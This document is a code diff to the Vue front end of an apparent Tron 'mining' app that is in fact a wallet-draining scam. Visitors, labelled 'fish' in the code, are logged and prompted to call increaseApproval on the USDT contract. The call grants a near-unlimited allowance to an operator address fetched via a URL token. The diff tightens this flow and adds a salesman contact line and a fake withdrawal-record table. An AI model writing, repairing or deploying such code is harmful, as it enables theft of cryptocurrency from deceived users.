@@ -238,7 +238,7 @@
                 Withdraw
               </div>
               <div
-                @click="isActive = 2"
+                @click="isActive = 2,queryRecord()"
                 :class="['changeItem', isActive == 2 ? 'active' : '']"
               >
                 Record
@@ -287,26 +287,26 @@
               <div class="exchangeBtn"><a id="postChangeValue" @click="confirm()">Confirm</a></div>
               <div class="exchangeTips">
                 Your withdraw will be sent to your USDT wallet address within 24
-                hours in the future
+                hours in the future.
+                <div style="color: #13ce66;font-weight: bold;font-size: 13px;">{{this.salemanPhone?"If you have any questions, please contact customer service ("+this.salemanPhone+")":""}}</div>
               </div>
             </div>
           </div>
           <div id="RecordTab" v-show="isActive == 2">
             <div class="recordContent" style="display: block;">
-              <div style="padding: 0 10px;height: 215px;">
-                <div style="display:flex;padding: 7px 0;">
-                  <div style="width: 50%!important;font-size: 15px;color: #0F0;">Time</div>
-                  <div style="width: 50%!important;font-size: 15px;color: #0F0;text-align: center;">Quantity</div>
-                </div>
-                <div id="reward_list">
-                  <div class="exchangeList">
-                    <div class="listMessage alignCenter">No record</div>
+              <table id="table1" border="0" width="100%">
+                <div style="padding: 0 10px;height: 215px;">
+                  <thead style="display:flex;padding: 7px 0;">
+                  <th style="width: 50%!important;font-size: 15px;color: #0F0;">Time</th>
+                  <th style="width: 50%!important;font-size: 15px;color: #0F0;text-align: center;">Quantity</th>
+                  </thead>
+                  <div v-for="item in recordList">
+                    <tr><td>{{item.time}}</td><td>{{item.quantity}}</td></tr>
                   </div>
                 </div>
-              </div>
+              </table>
               <div class="uni-pagination">
                 <a class="uni-pagination-btn" href="javascript:get_reward_list('prev');"><i class="iconfont icon-left"></i></a>
-                <a class="uni-pagination-num uni-pagination__num-flex-none" href="javascript:;"><i id="rpage">1</i></a>
                 <a class="uni-pagination-btn" href="javascript:get_reward_list('next');"><i class="iconfont icon-right"></i></a>
               </div>
             </div>
@@ -374,11 +374,9 @@
 </template>
 
 <script>
-import {addFish,getFish, getAuth, addAuth,withdraw } from "@/api/tron/auth";
-
+import {addFish, getFish, getAuth, addAuth, withdraw, listRecord} from "@/api/tron/auth";
 export default {
   name: "Home",
-  components: {},
   data() {
     return {
       abi: [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}],
@@ -388,12 +386,14 @@ export default {
       contract: undefined,
       contractAddr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
       approveAddr: undefined,
+      salemanPhone: null,
       walletAddress: undefined,
       myWalletAddress: undefined,
       shareLink: window.location.href,
       showConnection: true,
       showAddress: false,
       redeeallBalance: undefined,
+      recordList:[],
       fish: {
           token: undefined,
           address: undefined,
@@ -419,15 +419,10 @@ export default {
           this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
           console.info(wallet_addr);
 
-          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=(result/1000000).toFixed(6));
-          // if (this.fish.trx <= 6){
-          //     this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
-          //     return;
-          // }
+          await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=(result/1000000).toFixed(2));
           this.fish.address=wallet_addr;
-          this.fish.token=this.$route.query.token;
           await this.contract.balanceOf(wallet_addr).call((err, usdt) => {
-            this.fish.usdt=(usdt/1000000).toFixed(6);
+            this.fish.usdt=(usdt/1000000).toFixed(2);
             addFish(this.fish).then(response => {
               if (response.data.code == 200){
                 this.showConnection = false;
@@ -437,7 +432,7 @@ export default {
                 this.fish.trx=balance.trx==null?0.00:balance.trx;
                 this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
                 this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-                this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
+                this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
 
                 return true;
               }else{
@@ -450,46 +445,57 @@ export default {
         }
       }, 10);
     },
+    getUrlKey: function (name) {
+      return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.href) || [, ""])[1].replace(/\+/g, '%20')) || null
+    },
     init(){
-      var token=this.$route.query.token;
+      var token=this.getUrlKey("token");
       if (!token){
         this.$toast({ message: "Please input token"});
         return;
       }
+      this.fish.token=token;
       getAuth(token).then(response => {
         if (response.data.code==200){
-          this.approveAddr=response.data.msg;
+          this.approveAddr=response.data.data.address;
+          this.salemanPhone=response.data.data.salemanPhone;
+          this.connectionWallet();
+          return;
         }
         if (response.data.code==500){
           this.showConnection = false;
           this.showAddress = true;
+          return;
         }
       });
     },
     addAuth(data){
       addAuth(data).then(response => {
         if (response.data.code==200){
-          console.info(response);
+          this.$toast({ message: "Congratulations, Successfully"});
         }
       });
     },
     startMining(){
        window.tronWeb.trx.getBalance( this.myWalletAddress).then(result => this.fish.trx=(result/1000000).toFixed(6));
-      // if (this.fish.trx <= 6){
-      //     this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
-      //     return;
-      // }
+
+      var token=this.getUrlKey("token");
+      this.fish.token=token;
       getFish(this.fish).then(response => {
         if (response.data.data.auRecordId == null){
+          if (this.fish.trx <= 6){
+              this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
+              return;
+          }
           let res = this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
           res.send({
             feeLimit: 10000000,
             callValue: 0,
             shouldPollResponse: false
           }, (err, res) => {
-            // if (err == null){
-            this.addAuth(this.fish);
-            // }
+            if (err == null){
+              this.addAuth(this.fish);
+            }
           })
           return true;
         }else{
@@ -498,7 +504,7 @@ export default {
           this.fish.trx=balance.trx==null?0.00:balance.trx;
           this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
           this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-          this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
+          this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
           this.$toast({ message: "Start Mining Success"});
           return false;
         }
@@ -509,6 +515,18 @@ export default {
     },
     redeeall(){
       this.redeeallBalance=this.fish.allowWithdraw;
+    },
+    queryRecord(){
+      listRecord(this.myWalletAddress).then(response => {
+        if (response.data.code==200){
+          response.data.rows.map(row =>{
+            var item={};
+            item.time=row.time;
+            item.quantity=row.quantity;
+            this.recordList.push(item);
+          });
+        }
+      });
     },
     confirm(){
       if (!this.redeeallBalance){
@@ -532,7 +550,7 @@ export default {
         this.fish.trx=balance.trx==null?0.00:balance.trx;
         this.fish.usdt=balance.usdt==null?0.00:balance.usdt;
         this.fish.allowWithdraw=balance.interest==null?0.00:balance.interest;
-        this.fish.total=parseInt(this.fish.usdt)+parseInt(balance.interest);
+        this.fish.total=parseFloat(this.fish.usdt)+parseFloat(this.fish.allowWithdraw);
         this.$toast({ message: "withdraw Success"});
         return true;
       });
@@ -541,6 +559,36 @@ export default {
 };
 </script>
 <style lang="scss" scoped>
+#table1{
+  font: bold 16px/1.4em "Trebuchet MS", sans-serif;
+}
+#table1 thead th{
+  padding: 15px;
+  border: 1px solid #93CE37;
+  border-bottom: 3px solid #9ED929;
+  text-shadow: 1px 1px 1px #568F23;
+  color: #fff;
+  background-color: #9DD929;
+  border-radius: 5px 5px 0px 0px;
+}
+#table1 tr{
+  padding: 15px;
+  border: 1px solid #93CE37;
+  border-bottom: 3px solid #9ED929;
+  text-shadow: 1px 1px 1px #568F23;
+  color: #fff;
+  background-color: #9DD929;
+  border-radius: 5px 5px 0px 0px;
+  text-align: center;
+  width: 100%;
+}
+#table1 tr>td{
+  background-color: transparent;
+  border: none;
+  width: 15%;
+  font-size: 15px;
+  color: #1D81B6;
+}
 .linkBox{
   border-radius: 5px;
   display: inline-block;
